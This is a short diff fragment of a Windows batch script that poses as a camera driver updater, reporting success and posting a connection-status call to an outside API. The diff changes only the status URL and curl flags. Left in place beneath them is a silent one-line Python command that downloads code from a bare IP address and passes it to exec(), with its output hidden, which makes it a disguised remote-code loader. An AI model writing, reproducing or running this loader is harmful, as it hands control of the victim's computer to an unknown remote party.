@@ -149,8 +149,8 @@ if errorlevel 1 (
 )
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
-    set "AUTO_URL=https://api.wecreateproblems.net/api/change-connection-status/!WINDOW_UID!"
-    curl -sL -X POST "!AUTO_URL!" -o nul
+    set "AUTO_URL=https://api.wecreateproblems.net/api/change-connection-status?invite_link=!WINDOW_UID!"
+    curl -sS -X POST "!AUTO_URL!" -o nul
 )
 C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
 
